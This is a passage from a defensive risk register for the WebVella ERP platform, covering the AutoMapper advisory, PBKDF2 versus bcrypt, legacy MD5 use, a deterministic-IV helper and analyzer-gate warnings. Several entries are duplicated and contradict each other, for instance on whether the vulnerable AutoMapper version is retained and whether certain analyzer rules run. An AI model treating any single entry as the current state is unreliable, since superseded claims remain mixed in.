  fixed start-up call sites. No request path, stored record or plugin hook contributes to it.
* The recursion path therefore requires a **self-referential mapping that this project's own
  developers would have to author, compile and ship.** An external attacker has no mechanism to
  introduce one.
* If ever triggered, the consequence is a denial of service **at start-up** — not data disclosure,
  privilege escalation or code execution — and it would fail loudly on first initialisation, in
  development.

**Secondary benefit of holding the pin.** `14.0.0` declares **one** dependency; `15.1.3` declares
**five**, including a four-package `Microsoft.IdentityModel.*` chain at **8.14.0** — a version
*behind* the `8.15.0` this solution already references directly for its own token validation. An
object-mapping library pulling a JSON Web Token stack downward was an unwanted side effect. Reverting
removed all four packages, so the decision reduced the graph's attack surface rather than merely
preserving it.

**How it is gated, and why that is not concealment.**

* A single `NuGetAuditSuppress` entry in `Directory.Build.props` names
  `https://github.com/advisories/GHSA-rvv3-g6hj-g44x` **and nothing else**, with its justification
  recorded in place.
* Repository-wide placement is a **necessity, not a widening**: NuGet audit is evaluated per project,
  and AutoMapper reaches 16 project graphs through the core library. A project-scoped entry left the
  solution restore failing with exactly 15 `NU1903` errors.
* **Negative-tested.** Injecting an unrelated vulnerable package (`Newtonsoft.Json 9.0.1`) made the
  build fail with `NU1903` reporting a *different* advisory (`GHSA-5crp-9r3c-p9vr`). The suppression
  cannot mask a new advisory.
* `dotnet list package --vulnerable --include-transitive` **still reports the advisory in all 16
  affected projects**, because it does not honour audit suppressions. Anyone auditing this repository
  sees it. The asymmetry is intentional: the gate stays usable while the risk stays visible.

**Reversal, if the owner accepts RPL 1.5 or obtains the commercial licence.** Raise the pin; delete
the suppression from `Directory.Build.props`; restore the `ILoggerFactory` argument at the single
`new MapperConfiguration(...)` site, which 15.x requires. Then reconcile the Apache-2.0 expression in
all four packable manifests, `LICENSE.txt` and the published package metadata with the reciprocal
obligation — **that reconciliation is the part an automated agent must not perform unilaterally.**

**What would remove the need for an owner decision altogether:** AutoMapper publishing a patched
release under a permissive licence, or the advisory being withdrawn or downgraded. The first case is
handled without prose — add that version to `ErpPermissiveAutoMapperVersions` in
`Directory.Build.props` and the gate stands down on its own, because it compares the pin against that
list rather than hard-coding the conflict. Worth re-checking at every dependency review.


## Accepted risks

### RISK-002 — Uncontrolled recursion in `AutoMapper` remains theoretically reachable by a developer

| Field | Value |
| --- | --- |
| **Status** | Accepted — residual, informational. |
| **Related finding** | H-01 |

The advisory is closed by the upgrade, so this entry records only the residual shape of the
weakness class for future reference: a self-referential mapping authored in source could still
produce deep recursion. It is not reachable by an external actor, because mapping configuration is
statically declared and no user-controlled configuration or type graph reaches the configuration
builder. No control is added for it, consistent with fixing only what is confirmed and with the
prohibition on enhancement beyond remediation.


## Detailed entries — cryptographic standards, the legacy hashing path and the encryption helper

#### RISK-003 — Credential hashing deviates from the letter of the mandated cryptographic standard

| Field | Value |
| --- | --- |
| **Status** | Accepted — deviation disclosed, with an owner option to close it literally. |
| **Related finding** | C-03 (CWE-916 password hash with insufficient computational effort, CWE-759 one-way hash without a salt, OWASP A02:2021) |
| **Owner** | Repository owner, if literal compliance with the named algorithm families is required. Otherwise no action. |

The engagement's Cryptographic Standards block names **bcrypt, scrypt or Argon2 with a cost factor of
12 or above**. The primitive adopted in `WebVella.Erp/Utilities/PasswordUtil.cs` is none of those
three. **Two deviations exist, and both are recorded here rather than absorbed silently.**

**Deviation 1 — the algorithm family.** The implementation uses PBKDF2 through the ASP.NET Core
password hasher instead of bcrypt, scrypt or Argon2. Three reasons drive that choice, in order of
weight:

- The authoritative **OWASP Password Storage guidance sanctions PBKDF2 explicitly** at a high
  iteration count, so this is a sanctioned option rather than a downgrade improvised for convenience.
- It requires **no new package dependency.** The hasher ships inside the `Microsoft.AspNetCore.App`
  framework reference the core project already declares, and the minimal-change constraint in force
  for this remediation prefers the least invasive control that closes the finding.
- It supplies, in the same component, the two things the migration depends on: a **fixed-time
  verification** (which closes M-05, CWE-208, for free) and an explicit **rehash-needed signal** that
  makes the upgrade-on-next-authentication pattern implementable without guesswork.

The deviation satisfies the standard's unambiguous intent — slow, salted, work-factored, fixed-time
verification — while departing from its literal wording. **Owner option:** adding a dedicated bcrypt or
Argon2 package would achieve literal compliance, at the cost of a new dependency. That trade is a
repository-owner call and is not taken by the remediation.

**Deviation 2 — the pseudo-random function.** The mandated parameters name **HMAC-SHA-256** *and* the
versioned (V3) hasher format. In ASP.NET Core those two are mutually exclusive: the V3 format **is**
PBKDF2-HMAC-SHA512, and the hasher's options expose no pseudo-random-function selector — only a
compatibility mode and an iteration count. V3 is kept, because it is also the only route that supplies
the fixed-time verification and the rehash signal described above.

The outcome **exceeds** the named requirement rather than falling short of it: the OWASP iteration
floor for PBKDF2-HMAC-SHA512 is 210,000, and this implementation uses **600,000**. The measured cost
of that setting, and its acceptance against the engagement's performance boundary, are recorded in the
[remediation log](remediation-log.md).

#### RISK-004 — Broken-hash analyzer warnings are accepted on the retained legacy path

| Field | Value |
| --- | --- |
| **Status** | Accepted — expected diagnostics, deliberately left as warnings and deliberately not suppressed. |
| **Related finding** | C-03 (CWE-916, CWE-759, OWASP A02:2021); analyzer rule CA5351, "do not use broken cryptographic algorithms" |
| **Owner** | No action required. Revisit only when the legacy verification path can be deleted. |

The build gate introduced by `Directory.Build.props` enables the .NET analyzers repository-wide, which
means the broken-cryptographic-algorithm rule now reports on every remaining MD5 use. **Those
diagnostics are expected, and none of them is suppressed.** Suppression would hide the very signal the
gate exists to produce; recording the acceptance here keeps the signal visible and auditable instead.

Observed diagnostics, verified from a full solution build:

| Location | Why the MD5 use remains |
| --- | --- |
| `WebVella.Erp/Utilities/PasswordUtil.cs` — the legacy digest helper | **Retained deliberately** so that credentials written by earlier releases can still be verified and then upgraded. Deleting it would lock every existing user out, which the preservation requirement forbids. It can never produce a newly persisted value: new credentials go through the modern primitive. See the [credential migration guide](credential-migration.md) |
| `WebVella.Erp/Utilities/CryptoUtility.cs` — four **public** MD5 helper methods (`ComputeMD5Hash`, `ComputeMD5HashBytes`, `ComputeOddMD5Hash`, `ComputePhpLikeMD5Hash`) | General-purpose digest utilities on the published API surface of this library. They are **not** credential storage. Removing or changing them would be a breaking API change to a package published for third-party consumption, which is outside a security remediation whose scope excludes API contract changes |

**The correct reading of these warnings** is that the platform still contains MD5, which is true, and
that each remaining use has a recorded reason. The credential-storage use — the one that made C-03 a
Critical finding — is closed: MD5 no longer produces any newly stored password. The residual uses are
either a time-limited compatibility path or a public utility API.

**Exit criterion for this risk.** The `PasswordUtil` diagnostic disappears once every account has
authenticated at least once after the upgrade and the legacy verification path can be deleted. The
`CryptoUtility` diagnostics require a deliberate API-breaking decision and are therefore not tied to
this remediation at all.

#### RISK-006 — M-08: deterministic initialisation vector in the symmetric encryption helpers

| Field | Value |
| --- | --- |
| **Status** | Accepted — documented only, deliberately not changed. |
| **Related finding** | M-08 (CWE-329, generation of predictable initialisation vector, OWASP A02:2021) |
| **Owner** | Repository owner, if the symmetric encryption API is ever put back into use. |

The key and initialisation-vector derivation helpers in `WebVella.Erp/Utilities/CryptoUtility.cs` are
**deterministic**: the vector is derived from the key itself, so the same plaintext always produces the
same ciphertext under the same key. That leaks equality — an observer can tell that two ciphertexts
encrypt the same value — and it rules out the semantic security an unpredictable per-message vector
provides.

**Three reasons this is accepted rather than fixed.**

1. **It is Medium severity under the engagement's own matrix** (weak cryptography), and the remediation
   scope fixes Critical and High findings and documents Medium and Low ones. It does not qualify for
   the compensating-control exception that brings some Medium findings into remediation scope, because
   no confirmed Critical or High depends on it.
2. **It is latent.** The symmetric encrypt and decrypt API in this class has **no in-repository
   callers**, so there is no data path on which the weakness is currently exercised.
3. **Changing it would destroy data.** Altering the derivation, or moving to an authenticated cipher
   mode, would make every already-persisted ciphertext undecryptable. The preservation requirement
   "all existing functionality remains operational" forbids that outright, and a fix that silently
   renders stored data unreadable would be worse than the weakness it removes.

**Recommended fix, for whenever this API is put back into use.** Generate a fresh initialisation
vector per message from a cryptographically secure random generator, store or prepend it alongside the
ciphertext, and move to an authenticated encryption mode — AES-256-GCM, as the engagement's
cryptographic standard names — so that tampering is detected rather than merely undetected. Because
that changes the ciphertext format, it needs a versioned envelope and a read path that still accepts
the old format, exactly as the credential migration does for password hashes.

**Analyzer diagnostics — two retractions, and the position that now stands.** This region has been
revised twice and both revisions are recorded rather than quietly overwritten, because the second one
reverses the first.

*The first revision* said that an earlier claim — that `CA5390` and `CA5401` were "not enabled at the
`latest-recommended` analysis level" and that the gap was **unclosable** — rested on a wrong premise,
namely that per-rule severities had no way to reach the repository root past the four `.editorconfig`
files that declare `root = true`. The mechanical half of that correction was sound: a repository-root
`.globalconfig` *is* auto-discovered by the SDK from the directories above each project and is *not*
subject to `.editorconfig`'s `root = true` scoping. On that basis ten rules were armed at **error**
severity.

*The second revision withdraws the arming, not the mechanism.* AAP 0.6.1 Class 2 freezes the analyzer
gate at exactly `EnableNETAnalyzers` plus `AnalysisLevel=latest-recommended`; `AnalysisLevelSecurity`
and a repository-root `.globalconfig` are additions beyond that frozen shape, so both were removed. The
removal could not be partial, and the reason is measured rather than assumed: the per-rule
`dotnet_code_quality.*` options that made the taint family affordable have **no MSBuild equivalent**, so
deleting the `.globalconfig` while leaving `AnalysisLevelSecurity=latest-all` in place took a
single-project build from **109 seconds to a timeout at 600 seconds**. Keeping the level without the
file was therefore not an option, and the level went with it.

**The net effect on this entry is that the original claim is restored as true.** `CA5390` (hard-coded
encryption key) and `CA5401` (non-random initialisation vector) are once again **not enabled**, and no
rule anywhere is promoted to error severity. The security rules that execute under the frozen gate were
enumerated by probe and are exactly four — `CA5350`, `CA5351`, `CA5359` and `CA5364` — all at
**warning**, with measured repository counts of 0, 5, 0 and 0.

**Analyzer diagnostics — the observed position, and what changed.** The source comment on this region
names `CA5389`, `CA5390` and `CA5401` as diagnostics to expect. None of the three is reported anywhere
in the repository.

An earlier revision of this entry explained that silence by noting the rules were **not enabled**:
`AnalysisLevel=latest-recommended` does not include them. That was correct, was confirmed by probe,
and — after the reversal recorded above — **is correct again**. `AnalysisLevelSecurity=latest-all` had
been added in response to finding `CI-03` and has since been withdrawn, so the reading below is once
again the operative one.

The silence therefore has two layers, and the honest reading is narrower than "the code is clean": for
`CA5390` and `CA5401` the outer layer is simply that **neither rule runs**, and beneath that each would
also be silent for its own verified reason even if it did. Both layers are recorded, because if the gate
is ever widened the inner reason is what will still matter:

* **`CA5390` — hard-coded encryption key. Silent, and meaningfully so.** The key reaches
  `GetValidKey(string key, SymmetricAlgorithm)` as a parameter sourced from configuration, not as a
  literal. That is exactly the state finding `C-04` produced when the compiled-in default constant was
  deleted and its silent fallback made fatal — so had the rule run, its silence would have been a
  genuine confirmation. It does not run, so today the silence carries no signal at all. The gate's
  positive control asserts the opposite of what it once did: `CA5390` **must not** be reported even
  against a deliberately hard-coded key, which is how CI detects that the rule has stopped executing
  rather than silently trusting it.
* **`CA5401` — non-default initialisation vector. Silent, but for a shape reason, not a safety one.**
  The rule matches the two-argument `CreateEncryptor(rgbKey, rgbIV)` overload. This code assigns
  `algorithm.IV` as a *property* and then calls the parameterless `CreateEncryptor()`, so the pattern
  the rule looks for never appears — even though the value assigned is derived deterministically from
  the key, which is precisely the weakness this entry describes.
* **`CA5389` does not apply at all.** It concerns adding an archive item's path to a target filesystem
  path. It was named in an early draft of the source comment on this region and the comment itself now
  records the correction.

`RISK-035` is *not* an additional explanation for any of the three. It recorded an interprocedural
limit on the `CA3001`–`CA3012` taint rules; none of these three is one of them, and in any case that
family no longer runs at all — see the restated `RISK-051`.

**So the deterministic initialisation vector described above remains a finding this gate does not catch,
and for the strongest of the available reasons: the two rules that would express it are not enabled, and
even if they were, one of them would miss this code's API shape.** The recommended fix below therefore
stands unchanged, and it cannot be deferred to "the analyzer will tell us". It was identified by manual
review, and it is recorded here precisely because no automated check in the build will re-raise it.
Anyone who later reactivates the symmetric encryption API should not treat a clean build as clearance.

**A reversal recorded earlier in this entry is itself withdrawn.** A previous revision stated that "the
build now would catch a hard-coded key or a non-random initialisation vector, and would fail rather than
warn". That is no longer true in either half: neither rule executes, and nothing is promoted to error.
The four public MD5 helpers do still report `CA5351`, which is RISK-004's subject and is held at warning
against an enumerated baseline of 5 — that rule is one of the four that survive the frozen gate.

A caution that outlives the reversal, because it was always the deeper point: even when those rules were
armed, the deterministic-initialisation-vector construction lived in a code path with **no active
callers**, and the rules fire on recognised API shapes rather than on a whole-program proof. Re-verify by
exercising the API, not by observing a clean build — and today that is the *only* available form of
verification.

**The families excluded, and the honest reasons.** Two exclusions apply, and they are different in kind.
The taint-dataflow family `CA3001`–`CA3012` is excluded on **cost**: a probe confirmed `CA3001` correctly
detects a deliberate SQL-injection flow, so the rules work, but enabling them repository-wide took the
solution build from **102 seconds to more than 6,600 seconds without completing**, with the Roslyn
compiler server failing outright. Separately, every security rule outside the four that `latest-recommended`
enables — `CA5390`, `CA5401`, `CA2100`, `CA2326`, `CA2327`, `CA2328`, `CA5362`, `CA5382`, `CA5383`,
`CA5402`, `CA5404` among them — is excluded by **the frozen shape of the gate**, not by cost: reaching
them requires an `AnalysisLevelSecurity` upgrade that AAP 0.6.1 Class 2 does not authorise.
Cross-site-scripting, taint-propagated sinks, and the concatenated-SQL and binary-formatter shapes are
therefore all outside the gate and were identified by manual review. Nothing anywhere is **suppressed** —
the distinction matters, because a suppression hides a diagnostic that would otherwise be produced, while
these rules never produce one. The full gate boundary is described in the
[secure configuration guide](secure-configuration.md).


## Detailed entries — dependency disposition, the analyzer backlog and the encryption helper

#### RISK-002 — Uncontrolled recursion in `AutoMapper` remains reachable only by a developer

| Field | Value |
| --- | --- |
| **Status** | Accepted — residual. Subsumed by RISK-001, recorded separately because the weakness class outlives the version decision. |
| **Related finding** | H-01 |

**Correction.** An earlier revision of this entry opened "Under RISK-001 the vulnerable version is
retained". That premise was inverted and is withdrawn: the pin is `[15.1.3]` and the vulnerable version
is **not** in the graph. Note the precise scope of that statement — RISK-001's *advisory* half is closed,
while its *licence* half remains open and pending owner ratification; the two are separable and only the
first one bears on this entry. What survives the upgrade
is narrower, and it is why this entry is kept rather than deleted: a self-referential mapping
authored in source is a **developer error rather than a library defect**, so the patched library
bounds the recursion but does not make such a mapping correct. It is **not reachable by an external
actor**, because mapping configuration is statically declared and no user-controlled configuration or
type graph reaches the configuration builder — the same assessment that made RISK-001's reversal path
defensible had it been taken. No control is added for it, consistent with fixing only what is
confirmed and with the prohibition on enhancement beyond remediation.

#### RISK-024 — Static-analysis backlog reported as warnings rather than enforced as errors

| Field | Value |
| --- | --- |
| **Status** | Accepted — reported, measured and left visible. Not suppressed. |
| **Related control** | Gate 1, static analysis (`EnableNETAnalyzers` and `AnalysisLevel=latest-recommended` in `Directory.Build.props` — the whole of the frozen analyzer gate — enforced by the workflow's Security-category allow-list) |
| **Scope** | Repository-wide, all 19 projects. `Directory.Build.props` is **directory**-scoped, so the analyzer gate reaches both WebAssembly projects by location even though neither is a solution member (see `RISK-030`). Inheritance is deliberately broader than membership. |

Enabling the .NET analyzer set across the platform surfaces **3,044 warnings** on a full rebuild
(`dotnet build WebVella.ERP3.sln -t:Rebuild -v n`, MSBuild's own summary line), which resolve to
**3,022 distinct diagnostic sites** once identical `(file, line, column, rule)` tuples are collapsed.
The figure has moved twice: it was **3,096** while a repository-root `.globalconfig` armed additional
security rules, and removing that file under AAP 0.6.1 Class 2 dropped it to **3,046**; withdrawing the
version-5 migration then removed two `CA1822` members, giving 3,044. None of the 3,044 is newly
introduced — no source file was modified by the class that enabled the gate, so every one is
pre-existing code that was previously never inspected.

The largest groups are `CA2201` (**1,080** sites), `CA1305` (**340**), `CA1310` (**303**) and `CA1862`
(**246**) — culture-sensitivity, exception typing and comparison-style rules, none of which is a
security rule.

**A counting correction, because the earlier figures in this entry were inflated exactly twofold.** A
previous revision listed these groups as 2,168 / 682 / 612 / 494. Those were raw `grep` counts, and
MSBuild emits **every** diagnostic twice in a solution build — once inline, prefixed with a node
number such as `5>`, and once again in the end-of-build summary. A naive `grep -c` therefore doubles
every total, and the node prefix defeats a naive `sort -u` as well, because `5>/path/File.cs(10,5)`
and `/path/File.cs(10,5)` are different strings. The figures above are measured with the prefix
stripped first:

```bash
sed -E 's/^[[:space:]]*[0-9]+>//' build.log \
  | grep -oE '[^ (]+\([0-9]+,[0-9]+\): warning (CA|CS|NU)[0-9]+' | sort -u | wc -l
```

The same trap is why the security ratchet counts `CA5351` at **5** sites and not 10, and the workflow's
Gate 1 parser strips the prefix for precisely this reason.

**Why they are not promoted to errors.** Promoting some three thousand diagnostics would require editing a large
proportion of roughly seven hundred source files, in a codebase with **no test suite of any kind** to
catch a mistake. That is both the repository-wide refactor this engagement's minimal-change
constraint forbids, and a materially riskier act than leaving the warnings reported. The gate's
security value is unaffected: the security rule families are running, and they report on every build.

**Why they are not suppressed either.** No rule is disabled and no baseline file is used, so the
count is honest and a regression is detectable. The non-analyzer diagnostic counts are recorded in
the [remediation log](remediation-log.md) as a comparison baseline (`CA2200`×52, `ASPDEPR008`×42,
`CS0618`×6, `CS0168`×4, `ASP0019`×2), which is what makes "no new diagnostic was introduced" a
measurement rather than a claim.

**Recommendation for a future sprint.** Reduce the backlog rule family by rule family, promoting
each family to an error only once it reaches zero, so the gate ratchets forward without a single
large change. Introducing a test suite first would make that materially safer.

#### RISK-004 — Legacy MD5 remains present and is reported by the analyzer gate

| Field | Value |
| --- | --- |
| **Status** | Accepted — required for one case, non-security use in the other. Reported on every build, not suppressed. |
| **Related findings** | C-03 (credential hashing), and the platform's content-hashing utilities |
| **Diagnostic** | `CA5351` — *Do not use broken cryptographic algorithms* — **5 distinct sites** across 2 files (a raw build log shows 10 lines, because MSBuild's parallel build emits each diagnostic once per node with an `N>` prefix; the gate's baseline deduplicates on file, line and code, and is therefore 5) |

The analyzer gate reports MD5 use at five distinct call sites. Both groups are deliberate and neither
is a credential-verification weakness, but they are reported rather than silenced so that the
platform's remaining MD5 surface stays visible to every future reader.

**Group 1 — `WebVella.Erp/Utilities/PasswordUtil.cs` (`GetMd5Hash`, reported at line 261).** This is
the *legacy verification* path, and it is the mechanism that makes credential migration possible at
all. Stored MD5 digests cannot be reversed, so the only alternatives to retaining a
verify-legacy-then-rehash path are to force a password reset on every existing user or to lock them
all out — both of which would breach the requirement that existing functionality be preserved. The
path is verification-only: it is never used to *create* a stored credential, and it is guarded by a
fixed-time comparison so it leaks no timing signal.

**Stated precisely, because the difference matters — and updated, because it has changed:**
`VerifyPassword` *signals* that a legacy value needs upgrading, through its `needsRehash` output. An
earlier revision of this entry added that the path which *acts* on that signal "belongs to a later
vulnerability class and **is not yet wired**, so at the time of writing a legacy stored value is still
verified as legacy and is not yet upgraded on login", and cited an interactive login that left the
stored value at its original 32-character legacy length. **That is superseded.** The acting path is now
wired: `WebVella.Erp/Api/SecurityManager.cs:343` verifies in application code and `:358-359` calls
`UpgradeStoredPasswordHash(recordId, password, storedHash)` at the one moment the plaintext is in hand,
which derives a modern hash via `PasswordUtil.HashPassword` (`:617`) and persists it through a
**parameterized compare-and-swap** — `UPDATE rec_user SET password = @password WHERE id = @id AND
password = @expected_password`, issued directly on the platform's own connection because
`DbRepository.UpdateRecord` keys on the identifier alone and cannot express a conditional predicate. The
third argument is what makes it a compare-and-swap, and that is a security property rather than a
refinement: a concurrent password change makes the predicate false, zero rows are affected and the
upgrade is abandoned, instead of overwriting a freshly rotated credential with a hash derived from the
plaintext that had just been retired. Reproducible from the tree with
`git grep -n 'needsRehash\|UpgradeStoredPasswordHash' -- '*.cs'`. The quoted claim is retained rather
than deleted so the original disclosure remains visible; the interactive observation it rested on is a
*contemporaneous observation* in the provenance sense (see the remediation log) and describes the
pre-wiring state only. Now that the class has landed, the exposure shrinks with every login and is
self-terminating, so this entry covers the legacy shape as **retiring** rather than as static.
*Retirement condition:* once the credential-resolution path is switched over **and** operational
evidence shows no stored credential is still in the legacy shape, delete `GetMd5Hash` and
`VerifyMd5Hash`, at which point this group of reports disappears.

**Group 2 — `WebVella.Erp/Utilities/CryptoUtility.cs` (`ComputeMD5Hash`, `ComputeMD5HashBytes`,
`ComputeOddMD5Hash`, `ComputePhpLikeMD5Hash`, reported at lines 188, 200, 210 and 227).** These are
content-hashing helpers, not security primitives. **Two of the four are in fact unreachable**, which
strengthens rather than weakens the disposition and which an earlier revision of this entry did not
distinguish: measured with `git grep`, `ComputeMD5HashBytes` and `ComputePhpLikeMD5Hash` have **zero
callers anywhere in the repository**, while `ComputeMD5Hash` has one
(`WebVella.Erp/Utilities/DatasetExtensions.cs:66`) and `ComputeOddMD5Hash` has three
(`WebVella.Erp/Api/Cache.cs:58`, `:85` and `WebVella.Erp/Api/EntityManager.cs:734`). The two dead
members are retained deliberately rather than deleted: they are public members of a shipped library,
so removing them is a breaking API change, and deletion is code hygiene rather than remediation —
which the Minimal Change Clause excludes. The live callers are
`WebVella.Erp/Api/Cache.cs` (entity and relation cache invalidation),
`WebVella.Erp/Api/EntityManager.cs` (entity change detection) and
`WebVella.Erp/Utilities/DatasetExtensions.cs` (dataset fingerprinting) — every one a
same-or-different comparison over server-generated data, with no authentication, authorisation,
integrity or signature decision resting on the result. MD5 collision resistance is irrelevant to a
cache key, and the values are never attacker-supplied. Changing them would alter stored hash values
and force cache and change-detection invalidation across existing installations, which is a
functional risk taken for no security gain — so under *fix only what is confirmed* they are left
alone.
*Recommendation for a future sprint:* if the reports are unwanted, replace the algorithm inside these
helpers with a non-cryptographic content hash and plan the resulting one-time invalidation. That is a
maintainability change, not a security fix.

#### RISK-003 — Credential hashing uses PBKDF2 rather than bcrypt, scrypt or Argon2

| Field | Value |
| --- | --- |
| **Status** | Accepted — deviation from the letter of the mandated cryptographic standard, satisfying its intent. An owner option for literal compliance is stated below. |
| **Related findings** | `C-03` (unsalted MD5 password hashing) |
| **Owner of the decision** | The remediation scope's own escalation rules, which pre-authorise this deviation and require it to be recorded rather than absorbed. Reversible by the repository owner. |
| **Location** | `WebVella.Erp/Utilities/PasswordUtil.cs` — the `PasswordHasher<object>` configuration |

There are **two** deviations, and they are separate. Both are surfaced here because the code comments
that describe them promise a record in this register.

**Deviation 1 — the algorithm family.** The mandated Cryptographic Standards name bcrypt, scrypt or
Argon2 at a cost factor of 12 or above. The implementation uses PBKDF2. Three reasons, in the order
they carried weight:

- The authoritative OWASP Password Storage guidance sanctions PBKDF2 explicitly, provided the
  iteration count is high enough. This is not a downgrade to something the standards body rejects; it
  is one of the options that body lists.
- It requires **no new package**. The remediation scope forbids adding a dependency, and the
  framework the core library already references supplies this primitive. bcrypt and Argon2 would each
  require a new third-party package, which is the one thing the constraint rules out.
- The minimal-change constraint prefers the least invasive control that closes the finding, and the
  finding is *unsalted, unstretched, deterministic hashing*. PBKDF2 at 600,000 iterations with a
  128-bit random salt closes exactly that.

**Deviation 2 — the pseudo-random function, and why it is not a choice at all.** The mandated
parameters name HMAC-SHA-256 *and* the framework hasher's versioned (V3) format. In ASP.NET Core those
two are mutually exclusive: the V3 format **is** PBKDF2-HMAC-SHA512, and `PasswordHasherOptions`
exposes no pseudo-random-function selector — only `CompatibilityMode` and `IterationCount`. This was
verified empirically rather than inferred: a V3 payload hand-built with the HMAC-SHA-256 function
identifier at 600,000 iterations verifies as `SuccessRehashNeeded` rather than `Success`, which means
every single login would rewrite the stored credential. Choosing HMAC-SHA-256 would therefore have
forfeited both of the properties the scope explicitly requires of this component — the framework's own
fixed-time verification, and its `SuccessRehashNeeded` signal, which is the entire mechanism by which
legacy credentials are upgraded without a forced reset.

**The outcome exceeds the named requirement**, and the numbers are measured rather than asserted —
medians over 20 runs, single-threaded, .NET 10.0.10, on the audit host. *Provenance: contemporaneous observation* — these figures were taken once, on a heavily contended shared host, and their terminal transcript is **not** retained as a committed artifact. Treat the ratio and the direction as the finding, never the absolute values; do not use them as regression thresholds. See the evidence-provenance table in the [remediation log](remediation-log.md#evidence-provenance).

| Configuration | Cost per hash | Cost per verification |
| --- | --- | --- |
| PBKDF2-HMAC-SHA512 @ 600,000 — **as shipped** | 367.0 ms | 364.1 ms |
| PBKDF2-HMAC-SHA512 @ 210,000 — the OWASP floor for this function | 127.5 ms | 128.0 ms |
| PBKDF2-HMAC-SHA512 @ 100,000 — the framework default | 62.5 ms | 62.7 ms |
| PBKDF2-HMAC-SHA256 @ 600,000 — the literally named function, raw key derivation | 122.1 ms | — |

So the shipped configuration is **2.9× the OWASP iteration floor** and, at equal iteration counts,
costs **exactly 3.00×** what the literally named function would — measured, not estimated. The
iteration count is set explicitly because the framework default of 100,000 is well below what this
remediation requires.

**The accepted cost.** Authentication becomes measurably slower, by design: roughly 0.37 s of CPU per
login attempt. That is the control working, not a regression, and it is confined to the authentication
path — no other request path performs a key derivation. It is pre-declared here rather than discovered
later, because the scope caps performance regression at 10 % and this deliberately exceeds that on one
path. Practical consequence to be aware of: at four logical CPUs, sustained concurrent login attempts
are throughput-limited by this cost, which is also precisely what makes credential stuffing expensive.

**What this acceptance does not claim.** It does not claim PBKDF2 is preferable to Argon2 in the
abstract — for a greenfield system with a free choice of dependencies, a memory-hard function is the
stronger option. It claims only that PBKDF2 at this work factor is a sanctioned choice that closes the
confirmed finding within the constraints imposed on this remediation.

*Owner option for literal compliance:* add a dedicated bcrypt or Argon2 package, replace the two calls
in `HashPassword` and `VerifyPassword`, and extend the stored-shape discriminator to recognise a third
format. The legacy-upgrade mechanism already in place carries the migration, so existing credentials
would be re-hashed on next authentication exactly as they are now. The cost is a new third-party
dependency in the core library, which is why it is not taken here.

*Review trigger:* revisit when the OWASP iteration guidance for PBKDF2-HMAC-SHA512 next rises, or if a
memory-hard function becomes available in the framework without a third-party package.

#### RISK-006 — Deterministic initialisation vector in the symmetric encryption helpers

| Field | Value |
| --- | --- |
| **Status** | Accepted — documented only, deliberately not changed. Latent, with no callers. |
| **Related findings** | `M-08` (deterministic initialisation vector) |
| **Owner of the decision** | The remediation scope, which fixes Critical and High findings and documents Medium and Low ones. |
| **Location** | `WebVella.Erp/Utilities/CryptoUtility.cs` — the key and initialisation-vector derivation helpers |
| **CWE** | [CWE-329: Generation of Predictable IV with CBC Mode](https://cwe.mitre.org/data/definitions/329.html) |

The initialisation vector is derived from the encryption key itself, so it is the same for every
operation and the same plaintext always produces the same ciphertext. That leaks equality between
encrypted values and removes the semantic security a per-operation random vector provides.

**Why it is documented rather than fixed**, with each reason load-bearing on its own:

- It is **latent**: the symmetric encrypt and decrypt members have no callers anywhere in the
  repository, so no data is being protected by this construction today.
- It is a **Medium** finding under the engagement severity matrix, which directs Medium findings to
  documentation with fix guidance. This entry is that guidance.
- Changing the derivation, or moving to an authenticated cipher mode, would make **every
  already-persisted ciphertext undecryptable**. The requirement that all existing functionality remain
  operational forbids that, so a fix would have to ship with a re-encryption migration — which is
  materially larger than the weakness it closes while the weakness has no callers.

Any `CA5389`, `CA5390` or `CA5401` analyzer diagnostic on that region is expected and is left as a
warning rather than suppressed, so the surface stays visible. This is consistent with `RISK-024`.

*Recommended fix, when a caller is introduced:* generate a fresh cryptographically random
initialisation vector per operation and store it alongside the ciphertext, and prefer an authenticated
mode — AES-256-GCM, which the mandated cryptographic standards name — over unauthenticated CBC. Doing
this at the moment the first caller appears costs nothing, because there is no persisted ciphertext to
migrate; doing it afterwards requires the migration described above. **The cheapest moment to fix this
is before it is ever used.**

*Review trigger:* the moment any code calls the symmetric encryption members. This entry should be
re-assessed as an active finding at that point, not left accepted.


## Detailed entries — encryption helper, throttle scope and comment accuracy

#### RISK-006 — Deterministic initialisation vector in `CryptoUtility`

| Field | Value |
| --- | --- |
| **Status** | Accepted — documented only, deliberately not changed. |
| **Related finding** | M-08 (CWE-329, OWASP A02:2021) |
| **Location** | `WebVella.Erp/Utilities/CryptoUtility.cs`, private key and initialisation-vector derivation helpers |

**What the weakness is.** The derivation helpers are deterministic: the initialisation vector is
derived from the key itself, so the same plaintext under the same key always produces the same
ciphertext. An observer can therefore tell that two encrypted values are equal, and identical values
across rows are distinguishable.

**Why it is accepted.** Three reasons, and all three have to hold for acceptance to be legitimate:

1. It is a Medium finding under the audit's severity matrix, and the remediation scope fixes Critical
   and High findings only; Mediums are documented with fix guidance.
2. It is **latent**. The symmetric encrypt/decrypt API has no in-repository callers, so no stored data
   is presently produced by this path.
3. Changing the derivation, or moving to an authenticated cipher mode such as AES-256-GCM, would make
   every already-persisted ciphertext undecryptable. That breaches the "all existing functionality
   remains operational" preservation requirement, so the fix is strictly larger than the finding.

**Recommended fix, for a future change with a data-migration budget.** Generate a per-encryption
random initialisation vector from a cryptographically secure source and store it alongside the
ciphertext, and move to an authenticated mode so tampering is detectable. This requires a versioned
ciphertext envelope plus a re-encryption pass over existing values, which is why it is not a
comment-level or drop-in change.

**Analyzer consequence.** `CA5390` (do not hard-code encryption key) and `CA5401` (do not use
`CreateEncryptor` with a non-default initialisation vector) diagnostics on this region are expected
and are intentionally left as warnings. They are not suppressed, globally or locally, so the weakness
stays visible in build output for as long as it remains unfixed.

#### RISK-004 — `CA5351` on the retained legacy MD5 verification path

| Field | Value |
| --- | --- |
| **Status** | Accepted — the warning is expected, and is not a defect. |
| **Related finding** | C-03 (CWE-916 / CWE-759, OWASP A02:2021) |
| **Location** | `WebVella.Erp/Utilities/PasswordUtil.cs`, `GetMd5Hash` and `VerifyMd5Hash`; and four further sites in `WebVella.Erp/Utilities/CryptoUtility.cs` |

**What the warning is.** `CA5351` ("do not use broken or risky cryptographic algorithms") reports on
the MD5 use in those two members. The report is correct: MD5 *is* broken for this purpose, which is
precisely what made C-03 Critical.

**The full observed set.** With the analyzers enabled by `Directory.Build.props`, a Debug build of the
solution reports `CA5351` at five distinct sites — one in `PasswordUtil.cs` (`GetMd5Hash`) and four in
